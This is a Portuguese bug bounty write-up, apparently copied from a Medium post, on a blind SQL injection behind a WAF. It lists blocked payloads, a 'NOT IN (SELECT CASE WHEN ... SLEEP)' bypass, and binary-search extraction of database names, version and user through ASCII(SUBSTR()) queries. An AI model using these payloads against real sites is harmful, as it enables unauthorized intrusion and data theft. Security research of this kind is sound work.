# Blind SQL Injection Behind a WAF

- **Source URL:** https://medium.com/@donghcoder/blind-sql-injection-behind-a-waf-bypassing-filters-with-a-not-in-case-when-sleep-oracle-081b7eb48d50
- **Fetched from:** https://medium.com/@donghcoder/blind-sql-injection-behind-a-waf-bypassing-filters-with-a-not-in-case-when-sleep-oracle-081b7eb48d50?source=rss-d4b1be9d06d5------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14905)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Guilhermegh / Wed, 09 Sep 2026 23:46:21 GMT

**Blind SQL Injection Behind a WAF: Bypassing Filters with a NOT IN + CASE WHEN SLEEP Oracle**

durante programa de bug bounty, encontrei um parâmetro numérico refletido em uma query SQL **\*\*sem aspas e sem prepared statement\*\***. Um WAF na frente bloqueava os payloads clássicos (UNION SELECT, \`AND/OR \<n>\`, \`SLEEP()\`, comentários). O bypass que funcionou: usar uma **\*\*subquery \`NOT IN (SELECT CASE WHEN \<condição> THEN SLEEP(…) END)\`\*\*** — construção que o WAF não assina — transformando a falha em um **\*\*oráculo temporal estável\*\*** e permitindo extrair o banco inteiro caractere a caractere via busca binária sobre \`ASCII(SUBSTR(…))\`.

**— -**

**## 1. A descoberta (error-based)**

o parâmetro \`id\` da rota \`/catalog/items\` era interpolado direto na query. Sinais clássicos:

\- \`?id=444'\` → erro SQL refletido na página (sintaxe perto do fim do valor) — **\*\*o erro é devolvido ao usuário\*\***.

\- \`?id=\` + crase \`444\` → \`Unknown column ‘444’\` → o valor entra **\*\*sem aspas\*\*** (vira identificador).

\- \`?id=444%1\` (\`MOD\`) → página vazia; \`?id=444 DIV 1\` → resultados de novo → **\*\*a expressão é avaliada\*\*** (contexto numérico executável).

\`\`\`

?cat=444' -> SQLSTATE syntax error (refletido)

?cat=\`444\` -> Unknown column ‘444’ in ‘WHERE’

?cat=444%1 -> 0 resultados (444 MOD 1 = 0)

?cat=444 DIV 1 -> resultados (expressao avaliada)

?cat=444,445 -> sintaxe de lista aceita (multi-valor)

**## 2. O WAF**

Qualquer tentativa de extração clássica retornava **\*\*403\*\***:

| Payload | Resposta |

| — -| — -|

| \`444' UNION SELECT 1 — -\` | 403 |

| \`444 AND 1=1\` / \`OR 1=1\` | 403 |

| \`SLEEP(3)\`, \`IF(..)\`, \`BENCHMARK(..)\`, \`GET\_LOCK(..)\` | 403 |

| \`EXTRACTVALUE(..)\`, \`UPDATEXML(..)\` | 403 |

| \` — \`, \`/\*\`, \`)#\`, \`&&\`, \`\|\|\` | 403 |

| subquery \`(SELECT\` após operador ou vírgula | 403 |

| \`version()\`, \`database()\` fora de string | 403 |

Curiosidade que ajudou a mapear: as mesmas keywords **\*\*dentro de strings SQL passavam\*\*** — o filtro tokeniza e ignora strings, então o jogo virou achar uma construção onde a “carga útil” não caísse em nenhum padrão assinado.

**## 3. O bypass: \`NOT IN (SELECT CASE WHEN … )\`**

Testando subqueries, uma construção específica **\*\*não era bloqueada\*\***:

?id=444 NOT IN (SELECT CASE WHEN \<cond> THEN SLEEP(0.0001) END)

E dentro do \`CASE WHEN\`, o filtro deixava passar o que bloqueava fora dele: \`SLEEP()\`, \`ASCII()\`, \`SUBSTR()\`, \`LENGTH()\`, subqueries em \`information\_schema\` — tudo.

O oráculo ficou **\*\*dicotômico e estável\*\***:

| Condição | Tempo de resposta |

| verdadeira | \~5 s |

| falsa | \~0,3 s |

\> Detalhe interessante: o \`SLEEP\` não roda 1 vez — a subquery é reavaliada **\*\*uma vez por linha varrida\*\*** pela query externa, então até \`SLEEP(0.0001)\` vira \~5 s (amplificação \~29.000×). Isso é ótimo para o atacante: permite usar sleeps minúsculos e ainda ter um sinal forte.

**## 4. Extração dos dados (busca binária)**

Com o oráculo, qualquer expressão SQL vira string extraível:

1\. **\*\*Comprimento\*\***: \`LENGTH(\<expr>) > N\` (busca binária)

2\. **\*\*Cada caractere\*\***: \`ASCII(SUBSTR(\<expr>, \<pos>, 1)) \< \<mid>\` (busca binária sobre 33–126)

3\. **\*\*Databases\*\***: \`(SELECT schema\_name FROM information\_schema.schemata ORDER BY schema\_name LIMIT n,1)\` comparado por igualdade

Custo típico: \~7 requisições por caractere (média \~2–3 s cada).

\`\`\`text

Expressão: @@version -> “10.x.x-\*\*\*\*-log” (exemplo)

Expressão: database() -> “wp\_\<redacted>” (exemplo)

Expressão: @@hostname -> host interno (IP privado)

Expressão: current\_user -> user@host (privilegios limitados a 2 schemas)

Databases visiveis -> information\_schema, \*\*\*\*\_\<redacted>

\## Referencia
